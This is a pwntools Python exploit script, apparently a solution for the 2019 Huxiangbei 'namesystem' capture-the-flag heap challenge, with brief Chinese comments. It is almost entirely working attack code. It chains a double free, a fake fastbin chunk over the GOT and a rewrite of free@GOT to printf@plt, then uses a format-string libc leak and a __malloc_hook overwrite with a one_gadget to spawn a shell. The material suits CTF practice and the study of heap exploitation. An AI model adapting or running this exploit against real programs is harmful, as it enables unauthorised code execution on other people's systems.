#coding:utf8
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
sh = process('./data/bin/heap23_40_huxiangbei_2019_namesystem')
#sh = remote('node3.buuoj.cn',29866)
elf = ELF('./data/bin/heap23_40_huxiangbei_2019_namesystem')
libc = elf.libc
printf_plt = elf.plt['printf']
 
def add(size,content):
   sh.sendlineafter('Your choice :','1')
   sh.sendlineafter('Name Size:',str(size))
   sh.sendafter('Name:',content)
 
def delete(index):
   sh.sendlineafter('Your choice :','3')
   sh.sendlineafter('The id you want to delete:',str(index))
 
 
for i in range(17):
   add(0x20,'a'*0x20)
#17
add(0x50,'b'*0x50)
#18
add(0x60,'a'*0x60)
#19
add(0x50,'c'*0x50)
#got表上伪造一个chunk
fake_chunk_addr = 0x0000000000601FFA
delete(18)
#19位置的指针移到18后没有清零，可以对19 double free
delete(19) #19
delete(17) #17
delete(17) #19
add(0x60,'a'*0x60) #17
add(0x60,'b'*0x60) #18
add(0x60,'c'*0x60) #19
#构造另一个double free
delete(18)
delete(19)
delete(17)
delete(17)
#腾出空间
for i in range(17,-1,-1):
   delete(i)
#将got表伪chunk链接到fastbin
add(0x50,p64(fake_chunk_addr) + b'\n') #0
add(0x50,b'b'*0x50) #1
add(0x50,b'c'*0x50) #2
#修改free的got表为printf_plt
add(0x50,b'a'*0xE + p64(printf_plt)[0:6] + b'\n') #3
#格式化字符串泄露地址
add(0x20,b'%13$p\n') #4
delete(4)
libc_base = int(sh.recvuntil('Done!',drop = True),16) - 0xF0 - libc.sym['__libc_start_main']
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
one_gadget_addr = libc_base + 0x4527a
realloc_addr = libc_base + libc.sym['realloc']
print('libc_base=',hex(libc_base))
print('malloc_hook_addr=',hex(malloc_hook_addr))
print('one_gadget_addr=',hex(one_gadget_addr))
add(0x60,p64(malloc_hook_addr - 0x23) + b'\n') #4
add(0x60,b'b'*0x60) #5
add(0x60,b'c'*0x60) #6
#写malloc_hook
add(0x60,b'\x00'*0xB + p64(one_gadget_addr) + p64(realloc_addr + 0x10) + b'\n')
#getshell
sh.sendlineafter('Your choice :','1')
sh.sendlineafter('Name Size:','50')
 
sh.interactive()